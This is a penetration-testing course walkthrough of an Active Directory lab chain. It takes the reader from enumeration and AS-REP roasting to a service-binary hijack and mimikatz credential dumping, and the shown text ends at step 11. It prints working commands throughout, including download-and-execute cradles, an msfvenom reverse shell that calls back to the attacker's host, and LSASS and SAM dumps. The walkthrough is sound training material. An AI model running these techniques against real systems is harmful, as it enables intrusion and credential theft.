
  
OSCP® Exam Prep CourseActive Directory Chains

Lesson 34 of 97

Completed

Start here8/8

Active Directory24/24

Active Directory Chains15/15

Chain 01: First ContactBuild a solid foundation for attacking Active Directory environments.Chain 02: StolenDevelop reliable credential access and lateral movement techniques.Chain 03: BleedWideExpand domain access through coordinated AD attacks and spraying.Chain 04: Inside JobLeverage pivoting to reach vulnerable services inside AD networks.Chain 05: GroupThinkPerform network pivoting and abuse misconfigured Group Policies to extend and maintain control.Chain 06: TrustfallShape misconfigurations and open services into borrowed authority.Chain 07: CrosslinkAbuse trusted access, traverse isolated networks, and escalate across hidden infrastructure.Chain 08: RicochetAbuse injectable endpoints, bypass their defense, and relay it across the domain to seize control.Chain 09: BloodhuntMap the hidden edges, and abuse what others overlook. Only the certified will be let through.Chain 10: ReplicantFollow the unseen edges, migrate into a living process, and make the controller surrender every secret.Chain 11: Cold StorageEscalate through a task, comb the host for credentials, and crack any encryption in your way.Chain 12: DelegateRun as the account left in the open, crack what the cache remembers, then delegate the rights to domain compromise.Chain 13: FailsafeDecrypt a GPP password, crack two vaults, and ride a WriteDacl edge to Domain Admin.Chain 14: Open RelayLeak a credential from SNMP, seize the Spooler for SYSTEM, then relay and reset your way to the domain.Chain 15: OverwriteHop a SQL linked server, loot LSA secrets twice, and reset an account to own the domain.

Initial Access17/17

Privilege Escalation15/15

Pivoting and Tunneling6/6

The Exam5/5

Notes and extras7/7

Lab

AD Chain_02

A domain controller and two Windows clients. Runs on your own machine. The download is sold in the shop, separate from membership, and is yours to keep.

[Get this chain](https://buymeacoffee.com/hackacademy/e/480741)[About this chain](https://hackerblueprint.com/labs#chain-02)[All chains bundle](https://buymeacoffee.com/hackacademy/e/582690)

Not startedStartedRooted

Wrote a walkthrough?

We'd love to see how you took this chain! Written up or on video, both are great. Email it to us and we'll take a look.

[Email your walkthrough](mailto:hacking.academy@protonmail.com?subject=Walkthrough%3A%20Chain%2002%3A%20Stolen)

Tags

AD EnumerationPort ScanningAS-REP RoastingLDAP EnumerationPassword CrackingPassword ReuseWindows PrivescPayload Generation

PreviousCompletedNext: Chain 03: BleedWideContinue

Chat  
and notesHelp[Ideas](https://discord.com/channels/1325919248954167468/1325966774881226862)

## Chain 02: Stolen

16 steps

Close

0:00 / 1:09:00

Auto

1

Enumerate the network and find the DC

BackNext step

Your lab addressesDC01 IPCLIENT-1 IPCLIENT-2 IPYour Kali IPLab subnet

1. 1Enumerate the network and find the DC_0:20_
    
    We open the working folder and read the credential we were handed, then map the subnet. A ping sweep gives the live hosts, and netexec over SMB names the machines and the domain: DC01 on `DC_IP` answers with signing enabled (the usual sign of a domain controller), and two clients CLIENT-1 and CLIENT-2 sit on `CLIENT1_IP` and `CLIENT2_IP`. The domain is hack-academy.local.
    
    A quick scan of port 88 (Kerberos) confirms the DC, since only `DC_IP` has it open. We then run a full TCP port scan of the three domain hosts and map the domain name in /etc/hosts so Kerberos and LDAP name resolution work. Only CLIENT-2 exposes RDP on 3389.
    
    Kali
    
    ```
    cat starting_creds.txt
    ```
    
    Copy
    
    Prints the file we were given to start the chain. It holds one domain credential, egreen with the password shown spaced around the colon.
    
    **Why**The whole chain pivots off this first account, so we read it before touching the network.
    
    Kali
    
    ```
    route
    ```
    
    Copy
    
    Shows the kernel routing table so we can read our local subnet and default gateway off eth0.
    
    **Why**We need the subnet in CIDR form before we can sweep it for live hosts.
    
    Kali
    
    ```
    fping -qag 192.168.98.0/24 | tee ips
    ```
    
    Copy
    
    Pings every address in the subnet and prints only the ones alive. -q is quiet, -a prints alive hosts, -g generates the range. tee writes the list to a file called ips.
    
    **Why**A fast layer-3 sweep gives the target list in one pass, and saving it to ips lets every later tool read it with -iL or as a targets file.
    
    **Other ways**nmap -sn LAB_NET does the same host discovery if fping is not installed.
    
    Kali
    
    ```
    netexec smb ips
    ```
    
    Copy
    
    Hits SMB on each host in the ips file and prints the OS, hostname, domain and whether SMB signing is required.
    
    **Why**It names the machines and the domain in one shot. Signing required on `DC_IP` is a strong hint that host is the domain controller.
    
    Kali
    
    ```
    nmap -v -p 88 -iL ips --open
    ```
    
    Copy
    
    Scans only TCP 88 (Kerberos) across the hosts in ips and shows only the ones with it open. -iL reads the input list, --open hides closed and filtered ports.
    
    **Why**Kerberos on 88 is served by the KDC, so the one host that answers is the domain controller. It confirms `DC_IP`.
    
    Kali
    
    ```
    nmap -p- -Pn -iL ips -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 --open -oN domain_ports.txt
    ```
    
    Copy
    
    Scans all 65535 TCP ports on the domain hosts. -p- is every port, -Pn skips host discovery, the rate and timeout flags speed it up, --open hides anything not open, -oN writes the result to domain_ports.txt.
    
    **Why**We want the full attack surface. It shows DC services on `DC_IP` and, important here, RDP 3389 open only on CLIENT-2.
    
    Kali (/etc/hosts)
    
    ```
    192.168.98.190 hack-academy.local
    ```
    
    Copy
    
    The line we add to /etc/hosts: it maps the domain controller address to hack-academy.local so names resolve locally.
    
    **Why**impacket and LDAP tools resolve the domain by name, so the host file entry keeps Kerberos and LDAP from failing on DNS.
    
    **Tip**A lowercase -il makes nmap treat the next word as a flag and the one after as a file to open. The input-list flag is a capital -iL.
    
2. 2Validate the starting credential_5:32_
    
    Before chasing anything clever we check what egreen can already do. netexec tries the credential over SMB, WinRM and RDP. It is valid domain-wide over SMB but is admin nowhere (no Pwn3d), has no WinRM, and only lists as valid for RDP on CLIENT-2.
    
    We try an interactive RDP session to CLIENT-2 with xfreerdp3, but the connection is reset and never establishes even though netexec reported the login valid. So egreen gives us no shell. That pushes us toward graph analysis in BloodHound to find a path we cannot see by hand.
    
    Kali
    
    ```
    netexec smb ips -u 'egreen' -p '!!pLaYa!!90'
    ```
    
    Copy
    
    Authenticates egreen over SMB against all three hosts. A [+] means the password is valid; (Pwn3d!) would mean local admin.
    
    **Why**First thing to learn about any credential is where it is valid and whether it is admin anywhere. Here it is valid everywhere but admin nowhere.
    
    Kali
    
    ```
    netexec winrm ips -u 'egreen' -p '!!pLaYa!!90'
    ```
    
    Copy
    
    Tries the same credential over WinRM (5985), the protocol evil-winrm uses for a remote PowerShell shell.
    
    **Why**WinRM is the cleanest remote shell if the account is allowed. All three come back negative, so evil-winrm is out.
    
    Kali
    
    ```
    netexec rdp ips -u 'egreen' -p '!!pLaYa!!90'
    ```
    
    Copy
    
    Checks the credential against RDP (3389) on each host.
    
    **Why**RDP is the only remaining interactive option. netexec marks it valid only on CLIENT-2, matching the port scan.
    
    Kali
    
    ```
    xfreerdp3 /v:192.168.98.196 /u:egreen /p:'!!pLaYa!!90' /cert:ignore +clipboard /dynamic-resolution
    ```
    
    Copy
    
    Opens an interactive RDP session to CLIENT-2 as egreen. /cert:ignore accepts the self-signed cert, +clipboard shares the clipboard, /dynamic-resolution resizes the desktop.
    
    **Why**netexec said the RDP login was valid, so we try the real session. It fails with a connection reset, so this account cannot actually log in interactively.
    
3. 3Collect and explore with BloodHound_7:48_
    
    We collect the domain over LDAP with netexec's built-in BloodHound collector, running as egreen and pointing DNS at the DC. It drops a ready-to-ingest zip under /root/.nxc/logs, which we copy to /tmp.
    
    Then we stand up BloodHound CE with Docker. curl pulls the official compose file, docker-compose brings up the three containers (Postgres, Neo4j and the web app), and the initial admin password is printed in the bloodhound container log. We open [http://localhost:8080](http://localhost:8080/), sign in as the built-in admin spam@example.com with that password, set a new password when prompted, and upload the collection zip on Administration then File Ingest.
    
    With data loaded we search EGREEN@HACK-ACADEMY.LOCAL in Explore and mark the node Owned so BloodHound can path from it. A Cypher query for members of groups ending in -512 returns the two Domain Admins, ZMILLER@HACK-ACADEMY.LOCAL and ADMINISTRATOR@HACK-ACADEMY.LOCAL. The prebuilt Kerberos query for accounts with DontReqPreAuth returns a single node, CLEE@HACK-ACADEMY.LOCAL, the only AS-REP roastable user.
    
    Kali
    
    ```
    netexec ldap 192.168.98.190 -u 'egreen' -p '!!pLaYa!!90' --bloodhound --collection All --dns-server 192.168.98.190
    ```
    
    Copy
    
    Runs netexec's LDAP BloodHound collector as egreen against the DC. --collection All gathers every edge type, --dns-server points name resolution at the DC so objects resolve.
    
    **Why**A read-only domain user can enumerate the whole directory over LDAP, which is enough to build the graph without ever landing on a host.
    
    **Other ways**bloodhound-python -u egreen -p '!!pLaYa!!90' -d hack-academy.local -ns DC_IP -c All does the same collection if you prefer the standalone ingestor.
    
    Kali
    
    ```
    cp /root/.nxc/logs/DC01_DC_IP_2025-08-08_113849_bloodhound.zip /tmp
    ```
    
    Copy
    
    Copies the collector's output zip into /tmp. Your own file name will carry the real DC address and the collection timestamp.
    
    **Why**Staging the zip in a short path makes it easy to find in the browser upload dialog.
    
    Kali
    
    ```
    curl -L https://ghst.ly/getbhce -o docker-compose.yml
    ```
    
    Copy
    
    Downloads the official BloodHound Community Edition docker-compose.yml. -L follows the ghst.ly redirect.
    
    **Why**The compose file defines the three containers BloodHound CE needs, so we fetch it before starting them.
    
    Kali
    
    ```
    docker-compose pull && docker-compose up -d
    ```
    
    Copy
    
    Pulls the app, Postgres and Neo4j images, then starts all three containers in the background.
    
    **Why**BloodHound CE runs as these containers; -d leaves them running while we work in the terminal.
    
    Kali
    
    ```
    docker-compose logs bloodhound | grep -i passw
    ```
    
    Copy
    
    Reads the bloodhound container log and filters for the password line, which prints the one-time initial admin password.
    
    **Why**BloodHound CE generates a random admin password on first start and only shows it in the log, so this is how you get your first login.
    
    **Tip**The initial password is unique per install and forces a change on first login. If you miss it in the log, you can reset the containers and read it again.
    
4. 4AS-REP roast and crack clee_11:48_
    
    BloodHound pointed us at clee, the one account that does not require Kerberos pre-authentication. First we build a clean user list straight from LDAP, filtering netexec's output down to the sAMAccountName column and saving it to users.
    
    We store the DC address in a shell variable, confirm the DC is reachable, then run impacket-GetNPUsers against the whole user list. Every account refuses except clee, which returns a Kerberos AS-REP hash. We paste that hash into a file and crack it with john and rockyou. The result is clee's cleartext password, which we record next to its source in a notes file.
    
    Kali
    
    ```
    cat users
    ```
    
    Copy
    
    Prints the users file. At this point an earlier try with a mistyped password left it empty.
    
    **Why**We check the file is empty to understand why the first collection returned nothing before re-running it correctly.
    
    Kali
    
    ```
    netexec ldap 192.168.98.190 -u egreen -p '!!pLaYa!!90' --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print$ 5}' | tee users
    ```
    
    Copy
    
    Lists domain users over LDAP, strips netexec's status lines and the header row, keeps the fifth field (the username) and writes the clean list to users.
    
    **Why**GetNPUsers needs a plain username list. Building it from LDAP as egreen keeps it accurate to this domain.
    
    **Other ways**netexec ... --rid-brute can enumerate users through SMB if LDAP user listing is blocked.
    
    Kali
    
    ```
    export DC=192.168.98.190
    ```
    
    Copy
    
    Stores the DC address in the shell variable DC.
    
    **Why**We reuse $DC in the ping and the GetNPUsers call so the address is typed once.
    
    Kali
    
    ```
    ping $DC
    ```
    
    Copy
    
    Sends ICMP echo to the DC and expects replies.
    
    **Why**A quick reachability check before Kerberos work, so a failure later is not only a routing problem.
    
    Kali
    
    ```
    impacket-GetNPUsers -dc-ip $DC hack-academy.local/ -usersfile users
    ```
    
    Copy
    
    Asks the KDC for an AS-REP for each user in the file. Accounts with pre-auth enabled are refused; one without it returns a crackable $krb5asrep$23 hash.
    
    **Why**This is AS-REP roasting. Only clee has DontReqPreAuth, so only clee hands back a hash we can take offline.
    
    Kali
    
    ```
    gedit hash
    ```
    
    Copy
    
    Opens an editor so we can paste the clee AS-REP hash and save it to a file called hash.
    
    **Why**john reads the hash from a file, so we store it first.
    
    Kali
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt hash
    ```
    
    Copy
    
    Cracks the AS-REP hash with john using the rockyou wordlist. john auto-detects the krb5asrep format.
    
    **Why**The AS-REP is an offline-crackable blob, so a wordlist attack recovers clee's password without touching the domain.
    
    **Other ways**hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt cracks the same etype 23 AS-REP on a GPU.
    
    Kali
    
    ```
    gedit notes&
    ```
    
    Copy
    
    Opens a notes file in the background (& returns the prompt) to track credentials as we gather them.
    
    **Why**Keeping a running cred list avoids retyping passwords and shows which account came from where.
    
    Kali (notes file)
    
    ```
    starting creds:
    egreen : !!pLaYa!!90
    
    from asrep:
    !!XzUfrog69      ($krb5asrep$23$clee@HACK-ACADEMY.LOCAL)
    ```
    
    Copy
    
    The content we write into the notes file: the starting egreen credential and clee's cracked password next to the AS-REP hash it came from.
    
    **Why**A tidy source-tagged cred list becomes the spray wordlist later, so we record each win as we get it.
    
5. 5Spray clee and get an RDP foothold_15:36_
    
    With clee's password we repeat the validation sweep. clee is valid domain-wide over SMB but admin nowhere, has no WinRM, and over RDP comes back as Pwn3d on CLIENT-2. That is our foothold.
    
    We check clee's share access and user listing on the DC (standard domain-user access), then RDP into CLIENT-2 with xfreerdp3, adding a mapped drive so we can move files. Inside, a single whoami /all shows hack-academy\clee is a plain user at medium integrity with only SeChangeNotifyPrivilege enabled, so the next move is local privilege escalation.
    
    Kali
    
    ```
    netexec smb ips -u clee -p '!!XzUfrog69'
    ```
    
    Copy
    
    Validates clee over SMB on all three hosts.
    
    **Why**We re-run the same checks for the new account to see where it is valid and whether it is admin anywhere.
    
    Kali
    
    ```
    netexec winrm ips -u clee -p '!!XzUfrog69'
    ```
    
    Copy
    
    Tries clee over WinRM on all three hosts.
    
    **Why**Checking for a WinRM shell first, since it is cleaner than RDP. All three refuse.
    
    Kali
    
    ```
    netexec rdp ips -u clee -p '!!XzUfrog69'
    ```
    
    Copy
    
    Checks clee over RDP on each host. CLIENT-2 returns (Pwn3d!).
    
    **Why**RDP is the remaining interactive route, and the Pwn3d on CLIENT-2 tells us clee can actually log in there.
    
    Kali
    
    ```
    netexec smb $DC -u clee -p '!!XzUfrog69' --shares
    ```
    
    Copy
    
    Lists the SMB shares clee can read on the DC.
    
    **Why**Share access often leaks files or scripts. Here clee only gets the default domain-user shares, nothing special.
    
    Kali
    
    ```
    netexec smb $DC -u clee -p '!!XzUfrog69' --users
    ```
    
    Copy
    
    Enumerates domain users through SMB as clee.
    
    **Why**Confirms the same 15 accounts from clee's own credential, cross-checking the earlier LDAP list.
    
    Kali
    
    ```
    xfreerdp3 /v:192.168.98.196 /u:clee /p:'!!XzUfrog69' /cert:ignore +clipboard /dynamic-resolution /drive:.,share
    ```
    
    Copy
    
    Opens an RDP session to CLIENT-2 as clee. /drive:.,share maps the current Kali folder into the session as a drive named share.
    
    **Why**This login succeeds, giving our first interactive desktop. The mapped drive is a handy channel for moving tools in and out.
    
    CLIENT-2 (PowerShell)
    
    ```
    whoami /all
    ```
    
    Copy
    
    Prints our user, SID, group memberships and privileges in one call.
    
    **Why**We read the token to plan privesc. clee is a medium-integrity user with only SeChangeNotifyPrivilege enabled, so no token-based shortcut is available.
    
6. 6Find a writable service with PowerUp_20:36_
    
    The target has no internet, so pulling PowerUp straight from GitHub hangs. We host it from Kali instead. On Kali we move into the privesc tools folder, download a fresh PowerUp.ps1, read our eth0 address, and start a Python HTTP server on port 80.
    
    On the target we run the PowerUp download cradle pointed at our Kali server and call Invoke-AllChecks. It flags several services whose binaries the Everyone group can overwrite, all running as LocalSystem, including wampmysqld64 and Wondershare InstallAssist. A writable service binary that runs as LocalSystem is the escalation path: replace the file, get the service to start, and our code runs as SYSTEM.
    
    Kali
    
    ```
    cd /opt/tools/privesc
    ```
    
    Copy
    
    Changes into the folder where our Windows privesc tools live.
    
    **Why**We host PowerUp and later the payload from here, so we work in one place.
    
    Kali
    
    ```
    rm PowerUp.ps1
    ```
    
    Copy
    
    Deletes the existing PowerUp.ps1 so the fresh download keeps the clean name.
    
    **Why**An older copy was already present and wget had written a duplicate, so we clear it first.
    
    Kali
    
    ```
    wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Privesc/PowerUp.ps1
    ```
    
    Copy
    
    Downloads PowerUp.ps1 from the PowerSploit repo to the current folder.
    
    **Why**We need a local copy to serve to the target, which cannot reach GitHub itself.
    
    Kali
    
    ```
    ip a | grep -i eth0
    ```
    
    Copy
    
    Shows the eth0 interface line, which carries our Kali address `YOUR_IP`.
    
    **Why**The target download cradle must point at our address, so we confirm it before building the URL.
    
    Kali
    
    ```
    python3 -m http.server 80
    ```
    
    Copy
    
    Serves the current folder over HTTP on port 80.
    
    **Why**This is how the target pulls PowerUp.ps1, and later shell.exe, since it has no outbound internet.
    
    CLIENT-2 (PowerShell)
    
    ```
    powershell.exe -c "wget -useb 192.168.98.128/PowerUp.ps1 | iex; Invoke-AllChecks"
    ```
    
    Copy
    
    Downloads PowerUp from our Kali server, pipes it into Invoke-Expression to load it in memory, then runs Invoke-AllChecks. Here wget is the PowerShell alias for Invoke-WebRequest and -useb is -UseBasicParsing.
    
    **Why**Running PowerUp in memory from our own host avoids writing the script to disk and works without internet. Invoke-AllChecks lists every misconfiguration it finds.
    
    **Tip**If the cradle hangs, it is usually pointed at the internet. Host the script on Kali and point the URL at your own address.
    
7. 7Plant a payload in the service binary_23:12_
    
    We compare the flagged services. wampmysqld64 is DEMAND_START, so it will not launch on its own and we cannot start it as clee. Wondershare InstallAssist is AUTO_START and LocalSystem with a binary we can overwrite, so it is the target: it runs on every boot.
    
    The running service locks its exe, so we cannot overwrite it in place, but Windows still lets us rename it. We move the binary to a .bak name, which frees the original path, and icacls confirms Everyone has Full control there. On Kali we build a 64-bit reverse shell with msfvenom (LHOST set to eth0, LPORT 443), serve it, download it to the target and smoke-test it against an nc listener to prove the callback works as clee. Finally we copy our shell.exe over the service binary path.
    
    CLIENT-2 (PowerShell)
    
    ```
    sc.exe qc wampmysqld64
    ```
    
    Copy
    
    Queries the config of the wampmysqld64 service: its start type, binary path and the account it runs as.
    
    **Why**We check this candidate first. START_TYPE DEMAND_START means it will not auto-launch, which makes it a weaker target.
    
    CLIENT-2 (PowerShell)
    
    ```
    sc.exe start wampmysqld64
    ```
    
    Copy
    
    Tries to start the service by hand. It fails with Access denied (error 5).
    
    **Why**If we could start it we would not need a reboot. The denial shows clee cannot start services directly, so we need an AUTO_START one instead.
    
    CLIENT-2 (PowerShell)
    
    ```
    sc.exe qc "Wondershare InstallAssist"
    ```
    
    Copy
    
    Queries the Wondershare InstallAssist service. The name has a space, so it must be quoted. It shows AUTO_START, LocalSystem, and a writable binary path.
    
    **Why**This is the service we attack: it starts on every boot as LocalSystem from a path we can write, which is the whole basis of the privesc.
    
    CLIENT-2 (PowerShell)
    
    ```
    move C:\ProgramData\Wondershare\Service\InstallAssistService.exe C:\ProgramData\Wondershare\Service\InstallAssistService.exe.bak
    ```
    
    Copy
    
    Renames the running service binary to a .bak name.
    
    **Why**The service holds a lock so the file cannot be overwritten in place, but a locked exe can still be renamed, which frees the original path for our own file.
    
    CLIENT-2 (PowerShell)
    
    ```
    icacls C:\ProgramData\Wondershare\Service\InstallAssistService.exe.bak
    ```
    
    Copy
    
    Shows the ACL on the moved binary. Everyone has (F), Full control.
    
    **Why**Confirms we really can write at this location before we spend time building a payload.
    
    CLIENT-2 (PowerShell)
    
    ```
    icacls C:\ProgramData\Wondershare\Service\InstallAssistService.exe
    ```
    
    Copy
    
    Checks the original path, which now reports the file does not exist.
    
    **Why**Expected after the move. It confirms the path is free so our payload can take its place.
    
    Kali
    
    ```
    msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=eth0 LPORT=443 -f exe > shell.exe
    ```
    
    Copy
    
    Builds a 64-bit unstaged reverse TCP shell as a Windows exe. LHOST=eth0 lets msfvenom resolve our interface address, LPORT 443 is the callback port, -f exe writes a PE.
    
    **Why**The service is 64-bit and runs as SYSTEM, so we need a matching x64 payload that calls back to us. Port 443 blends with normal outbound traffic.
    
    **Other ways**The windows/x64/shell_reverse_tcp used here is a plain shell; windows/x64/meterpreter/reverse_tcp with an msfconsole handler gives a richer session.
    
    CLIENT-2 (PowerShell)
    
    ```
    powershell.exe -c "wget -useb 192.168.98.128/shell.exe -o shell.exe"
    ```
    
    Copy
    
    Downloads shell.exe from our Kali HTTP server into the current folder.
    
    **Why**We stage the payload on the target before planting it as the service binary.
    
    Kali
    
    ```
    rlwrap nc -lvnp 443
    ```
    
    Copy
    
    Starts a netcat listener on 443. rlwrap gives the caught shell line editing and history.
    
    **Why**The listener must be up to catch both the smoke-test callback and, later, the SYSTEM shell from the service.
    
    CLIENT-2 (PowerShell)
    
    ```
    .\shell.exe
    ```
    
    Copy
    
    Runs the payload once by hand. It calls back to our listener as hack-academy\clee.
    
    **Why**We smoke-test the exe before planting it, so we know the callback works before relying on it at boot.
    
    CLIENT-2 (PowerShell)
    
    ```
    copy .\shell.exe C:\ProgramData\Wondershare\Service\InstallAssistService.exe
    ```
    
    Copy
    
    Copies our payload onto the freed service binary path.
    
    **Why**Now the AUTO_START Wondershare InstallAssist service will launch our shell.exe as LocalSystem on the next boot.
    
    **Tip**A 32-bit payload paired with -a x64 fails with an arch mismatch. Match the payload family (windows/x64) to the service architecture.
    
8. 8Reboot into a SYSTEM shell_29:48_
    
    We re-confirm the service state before rebooting. sc query shows it RUNNING and sc qc shows it still AUTO_START as LocalSystem from the path we overwrote. We also check edgeupdate as a backup AUTO_START trigger. Running the planted binary by hand as clee only confirms it executes.
    
    Then we reboot the target. Our nc listener is already running, so when CLIENT-2 comes back the service starts our binary as LocalSystem and a shell lands on Kali. whoami /all shows nt authority\system with SeImpersonatePrivilege enabled. We now own the machine.
    
    CLIENT-2 (PowerShell)
    
    ```
    sc.exe qc edgeupdate
    ```
    
    Copy
    
    Queries the edgeupdate service config.
    
    **Why**PowerUp also flagged edgeupdate, so we keep it in mind as a second AUTO_START trigger in case the first does not fire.
    
    CLIENT-2 (PowerShell)
    
    ```
    sc.exe query "Wondershare InstallAssist"
    ```
    
    Copy
    
    Shows the current run state of the service. STATE 4 RUNNING.
    
    **Why**We confirm the service is live before rebooting, so we know the reboot will restart it.
    
    CLIENT-2 (PowerShell)
    
    ```
    C:\ProgramData\Wondershare\Service\InstallAssistService.exe
    ```
    
    Copy
    
    Runs the replaced binary directly by its absolute path. Note there is no .\ prefix on an absolute path.
    
    **Why**A quick check that the planted file executes. SYSTEM comes from the service starting it at boot, not from this manual run.
    
    CLIENT-2 (PowerShell)
    
    ```
    Restart-Computer
    ```
    
    Copy
    
    Reboots CLIENT-2, which closes our RDP session as the machine restarts.
    
    **Why**The service is AUTO_START, so the reboot is what launches our binary as LocalSystem and gives us the SYSTEM callback. An RDP user can trigger a restart even with SeShutdownPrivilege disabled.
    
    CLIENT-2 SYSTEM (cmd)
    
    ```
    whoami /all
    ```
    
    Copy
    
    Prints the identity of the caught shell. It is nt authority\system, SID S-1-5-18, with SeImpersonatePrivilege enabled.
    
    **Why**Confirms the escalation worked and that the service started our payload with full local privileges.
    
9. 9Dump credentials in memory with Invoke-Mimikatz_34:00_
    
    As SYSTEM we go after credentials. We confirm our Kali address for the download URL, then run Invoke-Mimikatz in memory from our hosted copy. The first run only yields the CLIENT-2$ machine account; no human logon passwords are in memory. We re-run it redirecting to dump.txt and grep the file for ntlm, user and username lines, which confirms only the machine account is present. So in-memory LSASS has nothing human, and we switch to reading the local SAM with native mimikatz next.
    
    Kali
    
    ```
    ip a | grep eth0
    ```
    
    Copy
    
    Prints the eth0 line to re-read our Kali address `YOUR_IP`.
    
    **Why**We confirm the address that goes into the download URLs for the mimikatz scripts.
    
    CLIENT-2 SYSTEM (cmd)
    
    ```
    powershell.exe -c "wget -useb 192.168.98.128/Invoke-Mimikatz.ps1 | iex; Invoke-Mimikatz"
    ```
    
    Copy
    
    Downloads Invoke-Mimikatz from Kali, loads it in memory with iex and runs it. It dumps logon sessions from LSASS.
    
    **Why**Running mimikatz in memory avoids dropping the exe and helps against AV. Here it only finds the CLIENT-2$ machine account.
    
    CLIENT-2 SYSTEM (cmd)
    
    ```
    powershell.exe -c "wget -useb 192.168.98.128/Invoke-Mimikatz.ps1 | iex; Invoke-Mimikatz > dump.txt"
    ```
    
    Copy
    
    Same in-memory run but redirects the output to dump.txt on the target.
    
    **Why**Saving the output to a file lets us search it with findstr instead of scrolling the console.
    
    CLIENT-2 SYSTEM (cmd)
    
    ```
    type dump.txt | findstr /i ntlm
    ```
    
    Copy
    
    Prints dump.txt and filters for lines containing ntlm, case-insensitive.
    
    **Why**A fast way to pull NTLM hashes out of a long dump. Only the machine account hash appears.
    
    CLIENT-2 SYSTEM (cmd)
    
    ```
    type dump.txt | findstr /i user
    ```
    
    Copy
    
    Filters the dump for lines containing user.
    
    **Why**We look for any human user sessions. There are none beyond service accounts.
    
    CLIENT-2 SYSTEM (cmd)
    
    ```
    type dump.txt | findstr /i username
    ```
    
    Copy
    
    Filters the dump for username lines.
    
    **Why**Confirms every session is the CLIENT-2$ machine account, so memory holds no human credential and we move to the SAM.
    
10. 10Read the local SAM with mimikatz_36:45_
    
    We stop the web server to swap in the native mimikatz binary, copy it into the web root, restart the server and download it to the target. We launch mimikatz, enable the debug privilege, elevate our token to SYSTEM, and dump LSA and the local SAM. This yields the local Administrator and David NTLM hashes (David is a local account, RID 1001), plus the CLIENT-2 machine SID. We also kick off sekurlsa::logonpasswords.
    
    A newer mimikatz build had trouble earlier, so the video also downloads and runs mimikatz 2.1.1 the same way (debug, then lsadump::sam and lsadump::lsa /patch) to confirm the same local hashes.
    
    Kali
    
    ```
    cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
    ```
    
    Copy
    
    Copies the 64-bit mimikatz.exe into the current web-root folder.
    
    **Why**We need to serve the native binary, so we place it where the HTTP server can reach it.
    
    Kali
    
    ```
    python3 -m http.server 80
    ```
    
    Copy
    
    Restarts the HTTP server on port 80 to serve mimikatz.exe.
    
    **Why**The server was stopped to add the binary, so we bring it back up for the download.
    
    CLIENT-2 SYSTEM (cmd)
    
    ```
    powershell.exe -c "wget -useb 192.168.98.128/mimikatz.exe -o mimikatz.exe"
    ```
    
    Copy
    
    Downloads the native mimikatz.exe from Kali onto the target.
    
    **Why**In-memory mimikatz found nothing human, so we run the full native binary to read the local SAM directly.
    
    CLIENT-2 SYSTEM (cmd)
    
    ```
    .\mimikatz.exe
    ```
    
    Copy
    
    Launches mimikatz, dropping to its own prompt.
    
    **Why**We need the interactive mimikatz prompt to run the lsadump modules.
    
    mimikatz
    
    ```
    privilege::debug
    ```
    
    Copy
    
    Enables SeDebugPrivilege inside mimikatz. It should return Privilege 20 OK.
    
    **Why**Reading other processes and LSA needs the debug privilege, so this is always the first mimikatz command.
    
    mimikatz
    
    ```
    token::elevate
    ```
    
    Copy
    
    Impersonates a SYSTEM token.
    
    **Why**SAM and LSA secrets are only readable as SYSTEM, so we elevate the mimikatz token before dumping.
    
    mimikatz
    
    ```
    lsadump::lsa /patch
    ```
    
    Copy
    
    Patches LSASS in memory and dumps LSA, returning the machine SID and some account NTLM hashes.
    
    **Why**/patch is the quick method that works on a local machine and surfaces the local account hashes.
    
    mimikatz
    
    ```
    lsadump::sam
    ```
    
    Copy
    
    Reads the local SAM database directly, printing the SysKey and the NTLM hashes of the local accounts, including Administrator and David.
    
    **Why**The SAM holds the local account hashes we want to reuse. David (RID 1001) is the local admin we carry forward.
    
    mimikatz
    
    ```
    sekurlsa::logonpasswords
    ```
    
    Copy
    
    Dumps cached logon sessions and credentials from LSASS.
    
    **Why**A final sweep for any live session secrets after patching LSA.
    
    CLIENT-2 SYSTEM (cmd)
    
    ```
    copy mimikatz.exe c:\windows\tasks\mimiatz.exe
    ```
    
    Copy
    
    Copies mimikatz into C:\Windows\Tasks. The destination name is typed with a missing letter, mimiatz.exe.
    
    **Why**C:\Windows\Tasks is world-writable and a quieter place to work from than system32.
    
    CLIENT-2 SYSTEM (cmd)
    
    ```
    cd c:\windows\tasks
    ```
    
    Copy
    
    Changes into the Tasks folder.
    
    **Why**We run the next mimikatz copy from here.
    
    CLIENT-2 SYSTEM (cmd)
    
    ```
    powershell.exe -c "wget 192.168.98.128/mimikatz.exe -o mimikatz_2.1.1.exe"
    ```
    
    Copy
    
    Downloads mimikatz again under the name mimikatz_2.1.1.exe using a forward-slash URL.
    
    **Why**A backslash in the URL breaks it, and cmd has no wget, so the download is done through PowerShell with a forward slash.
    
    CLIENT-2 SYSTEM (cmd)
    
    ```
    .\mimikatz_2.1.1.exe
    ```
    
    Copy
    
    Runs the 2.1.1 build of mimikatz.
    
    **Why**A newer build had failed earlier, so this known-good version is used to re-dump, running privilege::debug then lsadump::sam and lsadump::lsa /patch as above.
    
    **Tip**If a mimikatz dump errors part way, re-run with a known-good build like 2.1.1. The sam and lsa modules still return the local hashes.
    
11. 11Make clee a local admin on CLIENT-2_46:12_
    
    From a working SYSTEM shell we add clee to the local Administrators group, turning our domain user into a local admin on CLIENT-2 for reliable re-entry. The first SYSTEM shell we caught had a broken token (whoami returned an invalid-handle error and net user failed over RPC), so we caught a fresh shell on the listener, confirmed whoami was nt authority\system, read the local David account, and then added clee.
    
    We confirm it from Kali: netexec sprays clee again, marks CLIENT-2 Pwn3d, and -X runs whoami remotely, returning nt authority\system through atexec.
    
    CLIENT-2 SYSTEM (cmd)
    
    ```
    net user david
    ```
    
    Copy
    
    Reads the local David account and its group memberships. David is in the local Administrators group.
    
    **Why**We confirm which local accounts are admin. On the broken-token shell this failed over RPC; on the good shell it succeeds.
    
    CLIENT-2 SYSTEM (cmd)
    
    ```
    net localgroup administrators clee /add
    ```
    
    Copy
    
    Adds the domain user clee to the local Administrators group on CLIENT-2.
    
    **Why**This gives clee lasting admin on CLIENT-2, so we can come back over SMB without relying on the reverse shell.
    
    Kali
    
    ```
    netexec smb ips -u clee -p '!!XzUfrog69' -X whoami
    ```
    
    Copy
    
    Runs whoami on the hosts via netexec's -X PowerShell execution. On CLIENT-2 it falls back to atexec and returns nt authority\system.
    
